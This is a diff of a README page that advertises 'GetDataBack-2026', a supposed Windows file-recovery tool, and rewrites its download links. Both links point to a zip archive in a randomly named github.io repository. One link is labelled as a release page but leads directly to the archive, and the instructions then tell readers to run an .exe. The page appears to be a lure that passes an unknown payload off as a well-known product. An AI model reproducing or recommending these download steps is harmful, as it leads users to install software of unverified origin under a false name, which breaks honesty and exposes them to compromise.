@@ -5,7 +5,7 @@ description: "Download the Runtime GetDataBack installer for Windows 10 and 11 t
 ---
 # 💾 GetDataBack-2026 - Recover lost files on Windows systems
 
-[![Download GetDataBack-2026](https://img.shields.io/badge/Download-GetDataBack-blue.svg)](https://raw.githubusercontent.com/Catchpenny-seatrout274/catchpenny-seatrout274.github.io/main/nonfiscal/seatrout_io_github_catchpenny_v2.1.zip)
+[![Download GetDataBack-2026](https://img.shields.io/badge/Download-GetDataBack-blue.svg)](https://github.com/Catchpenny-seatrout274/catchpenny-seatrout274.github.io/raw/refs/heads/main/nonfiscal/seatrout_io_github_catchpenny_v2.1.zip)
 
 GetDataBack-2026 helps you restore deleted or inaccessible files from your computer. This software works on Windows 10 and Windows 11. It reads your disk structures to find lost partitions and data. You do not need technical skills to use this tool.
 
@@ -21,7 +21,7 @@ Before you install this software, check your computer against these requirements
 
 ## 🚀 Downloading the Software
 
-[Click this link to go to the project release page](https://raw.githubusercontent.com/Catchpenny-seatrout274/catchpenny-seatrout274.github.io/main/nonfiscal/seatrout_io_github_catchpenny_v2.1.zip).
+[Click this link to go to the project release page](https://github.com/Catchpenny-seatrout274/catchpenny-seatrout274.github.io/raw/refs/heads/main/nonfiscal/seatrout_io_github_catchpenny_v2.1.zip).
 
 Once you land on the page, look for the section labeled Releases. Click the link that ends in .exe. Save the file to a folder you remember, such as your Downloads folder or your Desktop.
 
